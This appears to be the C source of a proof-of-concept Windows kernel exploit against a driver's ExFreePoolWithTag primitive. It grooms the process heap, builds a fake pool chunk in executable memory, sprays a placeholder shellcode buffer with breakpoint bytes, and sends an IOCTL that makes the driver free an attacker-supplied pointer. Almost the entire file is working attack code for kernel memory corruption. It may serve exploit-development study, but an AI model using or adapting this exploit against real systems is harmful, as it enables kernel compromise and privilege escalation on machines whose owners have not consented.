#include "exploit.h"

char unused = 0, output[1024];
HANDLE h_driver = (HANDLE)-1;
void* heaps[HEAP_OBJECT_COUNT];
char* fake_pool_memory_page = (void*)0, * stack_allocation = (void*)0;
unsigned long bytes_returned = 0L, old_protection = 0L;
int success_counter = 0;

POOL_HEADER pool_header;
OBJECT_HEADER_QUOTA object_header_quota;
EX_PUSH_LOCK ex_push_lock;
QUAD quad;
OBJECT_HEADER object_header;

int main(int argc, char** argv)
{
	system("title ExFreePool");

	RtlSecureZeroMemory(heaps, sizeof(heaps));
	RtlSecureZeroMemory(&pool_header, sizeof(pool_header));
	RtlSecureZeroMemory(&object_header_quota, sizeof(object_header_quota));
	RtlSecureZeroMemory(&ex_push_lock, sizeof(ex_push_lock));
	RtlSecureZeroMemory(&quad, sizeof(quad));
	RtlSecureZeroMemory(&object_header, sizeof(object_header));
	RtlSecureZeroMemory(&output, sizeof(output));

	printf("%s[!] ExFreePoolWithTag Proof-of-Concept Exploit\n[!] Lets Exploit!", BANNER);

	h_driver = CreateFileA(DEVICE, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
	if (h_driver == (HANDLE)-1)
	{
		printf("\n[-] Failed to obtain a handle to the ExFreePool primitive driver. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Obtained a handle to the ExFreePool primitive driver. Handle Value: 0x%p", h_driver);

	stack_allocation = VirtualAlloc(0, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!stack_allocation)
	{
		printf("\n[-] Failed to allocate stack memory. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Allocated stack memory. Address: 0x%p", stack_allocation);

	for (int i = 0; i < 4096; i++)
	{
		*(stack_allocation + i) = 0xCC;
	}
	printf("\n[+] Sprayed the stack allocation with breakpoint instructions.\n[*] This will be utilized in the future.");

	for (int i = 0; i < HEAP_OBJECT_COUNT; i++)
	{
		heaps[i] = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 4096);
		if (!heaps[i])
		{
			printf("\n[-] Failed to allocate heap object %d.", i);
		}
		else
		{
			success_counter++;
		}
	}
	printf("\n[+] Allocated %d heap objects.\n[+] Successfully put the process heap into a predictable state.", success_counter);

	fake_pool_memory_page = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 4096);
	if (!fake_pool_memory_page)
	{
		printf("\n[-] Failed to allocate 4096 bytes onto the heap.");
		unused = getchar();
		return 1;
	}
	printf("\n[+] Allocated 4096 bytes onto the heap. Allocation Address: 0x%p", fake_pool_memory_page);

	if (!VirtualProtect(fake_pool_memory_page, 4096, PAGE_EXECUTE_READWRITE, &old_protection))
	{
		printf("\n[-] Failed to mark the allocation as read+write+executable. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Marked the allocation as read+write+executable.");

	success_counter = 0;
	for (int i = 0; i < HEAP_OBJECT_COUNT; i++)
	{
		if (!HeapFree(GetProcessHeap(), 0, heaps[i]))
		{
			printf("\n[-] Failed to free heap object %d. Error: %d (0x%x)", i, GetLastError(), GetLastError());
		}
		else
		{
			success_counter++;
		}
	}
	printf("\n[+] Freed the %d heap objects.", success_counter);

	initialize_pool_structs(fake_pool_memory_page, &pool_header, &object_header_quota, &ex_push_lock, &quad, &object_header);
	if (pool_header.PoolTag != POOL_TAG)
	{
		printf("\n[!] Initialized pool header structure does not appear to have a matching pool tag.\n[!] Pool tag %d (0x%x) does not match pool tag %d (0x%x).", pool_header.PoolTag, pool_header.PoolTag, POOL_TAG, POOL_TAG);
	}

	build_pool_chunk(fake_pool_memory_page, pool_header, object_header_quota, object_header);
	if (*(unsigned long*)(fake_pool_memory_page + 8) != POOL_TAG)
	{
		printf("\n[!] Fake pool chunk does not appear to have a matching pool tag.\n[!] Pool tag %d (0x%x) does not match pool tag %d (0x%x).", *(unsigned long*)(fake_pool_memory_page + 8), *(unsigned long*)(fake_pool_memory_page + 8), POOL_TAG, POOL_TAG);
	}

	printf("\n[!] Freeing the target pool chunk...");

	Sleep(1000);
	// __asm int 3

	DeviceIoControl(h_driver, TARGET_IOCTL, &fake_pool_memory_page, 4, &output, sizeof(output), &bytes_returned, 0);
	printf("\n[+] Freed the target pool chunk.\n[+] Exploit completed.");

	unused = getchar();
	return 0;
}